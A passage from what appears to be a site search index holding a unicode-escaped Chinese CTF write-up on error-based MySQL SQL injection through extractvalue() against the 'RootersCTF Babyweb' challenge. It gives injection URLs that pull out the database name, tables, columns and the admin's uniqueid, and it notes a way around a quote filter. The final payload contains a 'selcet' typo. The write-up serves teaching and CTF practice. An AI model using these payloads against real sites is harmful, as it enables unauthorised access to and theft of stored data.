\u7b2c\u4e00\u4e2a\u53c2\u6570\uff1aXML_document\u662fString\u683c\u5f0f\uff0c\u4e3aXML\u6587\u6863\u5bf9\u8c61\u7684\u540d\u79f0\uff0c\u6587\u4e2d\u4e3aDoc \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1aXPath_string (Xpath\u683c\u5f0f\u7684\u5b57\u7b26\u4e32) extractvalue\u6ce8\u5165\u7684\u539f\u7406\uff1a\u5982\u540cupdatexml\u4e00\u6837\uff0cextract\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8981\u6c42\u662fxpath\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u800c\u6211\u4eec\u8f93\u5165\u7684\u5e76\u4e0d\u662f\u3002\u6240\u4ee5\u62a5\u9519\u3002","title":"\u5206\u6790\u8fc7\u7a0b"},{"location":"web/SQLi/RootersCTF-Babyweb/#_2","text":"1\u3001\u7206\u5e93\u540d https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select%0adatabase()),0x7e)) br \u56de\u663eXPATH syntax error:~SQLinjection~\uff0c\u7206\u51fa\u4e86\u5e93\u540dSQLinjection 2\u3001\u7206\u8868\u540d https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) br \u56de\u663eXPATH syntax error:~users~\uff0c\u7206\u51fa\u4e86\u8868\u540dusers \u8fd9\u91cc\u9700\u8981\u8bf4\u540d\u4e00\u4e0b\uff0c\u7531\u4e8e\u5355\u53cc\u5f15\u53f7\u88ab\u8fc7\u6ee4\uff0c\u6545\u6ce8\u5165\u8bed\u53e5\u4e2d\u5982\u679c\u6709\u5b57\u7b26\u4e32\u9700\u8981\u5355\u53cc\u5f15\u53f7\uff0c\u5e94\u5f53\u5c3d\u91cf\u907f\u514d\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528\u67e5\u8be2\u8bed\u53e5\u7684\u591a\u91cd\u5229\u7528\u907f\u514d\uff0c\u5f53\u7136\u76f4\u63a5\u586b\u5e93\u540d\u4e5f\u662f\u4e0d\u9700\u8981\u5355\u53cc\u5f15\u53f7\u7684\uff08\u4e0b\u9762\u8868\u540d\u540c\u7406\uff09\u3002 3\u3001\u7206\u5217\u540d https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=(select group_concat(table_name) from information_schema.tables where table_schema=database())),0x7e)) br \u56de\u663eXPATH syntax error:~user\u3001uniqueid~\uff0c\u7206\u51fa\u5217\u540duser\u3001uniqueid\uff0c\u8fd9\u4e24\u4e2a\u5217\u91cc\u80af\u5b9a\u6709\u6211\u4eec\u9700\u8981\u7684\u91cd\u8981\u5185\u5bb9\u3002 4\u3001\u7206\u5b57\u6bb5 https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(selcet uniqueid/user from users limit 1),0x7e)); br \u8fd9\u91cc\u5206\u4e24\u6b65\u5206\u522b\u7206\u51faadmin\u548c\u5176\u5bf9\u5e94\u768418\u4f4d\u7684uniqueid\uff0c\u62ff\u53bb\u5c1d\u8bd5\u767b\u5f55\uff0c\u6210\u529f\u767b\u8def\u5e76\u62ff\u5230flag\u3002 \u7531\u4e8e\u73af\u5883\u4e0d\u80fd\u590d\u73b0\uff0c\u505a\u9898\u7684\u65f6\u5019\u4e5f\u6ca1\u6709\u622a\u56fe\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d34\u51fa\u56fe\u7247\u3002 \u62a5\u9519\u6ce8\u5165\u53c2\u8003\u94fe\u63a5\uff1a https://www.jianshu.com/p/bf5edd484957","title":"\u6ce8\u5165\u8fc7\u7a0b"}]}